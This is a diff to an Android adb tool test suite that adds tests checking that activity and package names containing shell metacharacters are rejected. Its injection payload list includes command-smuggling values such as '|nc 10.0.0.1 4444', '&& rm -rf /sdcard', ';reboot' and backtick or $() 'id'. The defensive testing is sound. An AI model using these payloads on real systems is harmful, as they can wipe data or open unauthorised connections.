@@ -8,6 +8,7 @@ import {
   matchComponentName,
   buildStartCmd,
   extractMatchingPermissions,
+  assertSafeComponentName,
 } from '../../lib/tools/app-commands';
 import {getBuildToolsDirs} from '../../lib/tools/system-calls';
 import {parseAapt2Strings, parseAaptStrings} from '../../lib/tools/apk-utils';
@@ -696,6 +697,66 @@ package:com.android.chrome`;
     it('test invalid activity name', function () {
       const activity = 'User@123';
       expect(matchComponentName(activity)).to.be.null;
+    });
+  });
+
+  describe('assertSafeComponentName', function () {
+    const legitNames = [
+      'org.wikipedia.main.MainActivity',
+      'org.wikipedia.alpha',
+      '.MainActivity',
+      'com.foo.Bar$Inner',
+      'com.foo/com.foo.Bar',
+      'com.foo.A,com.foo.B',
+      'com.foo.*',
+      'com.foo.A,com.bar.*,.C',
+      'com.foo_bar.App2',
+      'ןذأצЮυπиС.נפשוקשΤπΟ.ЦοКسئοهΦΦ',
+    ];
+    const injectionPayloads = [
+      'org.wikipedia.main.M;id>&2;aaaa',
+      'com.x/.A;reboot',
+      'com.x/.A`id`',
+      'com.x/.A$(id)',
+      'com.x/.A|nc 10.0.0.1 4444',
+      'com.x/.A && rm -rf /sdcard',
+      'com.x/.A\nid',
+      'com.x/.A{id,}',
+      'com.x/.A!whoami',
+    ];
+
+    for (const name of legitNames) {
+      it(`should accept legitimate name '${name}'`, function () {
+        expect(() => assertSafeComponentName(name, 'activity name')).to.not.throw();
+      });
+    }
+    for (const payload of injectionPayloads) {
+      it(`should reject injection payload '${payload}'`, function () {
+        expect(() => assertSafeComponentName(payload, 'activity name')).to.throw(/illegal characters/);
+      });
+    }
+  });
+
+  describe('command injection prevention', function () {
+    it('startApp should reject an activity name containing shell metacharacters', async function () {
+      await expect(
+        adb.startApp({pkg: 'org.wikipedia.alpha', activity: 'org.wikipedia.main.M;id>&2;aaaa'}),
+      ).to.be.rejectedWith(/illegal characters/);
+    });
+    it('startApp should reject a package name containing shell metacharacters', async function () {
+      await expect(
+        adb.startApp({pkg: 'org.wikipedia.alpha`id`', activity: '.MainActivity'}),
+      ).to.be.rejectedWith(/illegal characters/);
+    });
+    it('waitForActivityOrNot should reject a wait activity containing shell metacharacters', async function () {
+      await expect(
+        adb.waitForActivityOrNot(apiDemosPackage, '.Main;reboot', false, 1000),
+      ).to.be.rejectedWith(/illegal characters/);
+    });
+    it('waitForActivityOrNot should reject a wait package containing shell metacharacters', async function () {
+      await expect(
+        adb.waitForActivityOrNot('com.foo$(id)', '.Main', false, 1000),
+      ).to.be.rejectedWith(/illegal characters/);
     });
   });
 });
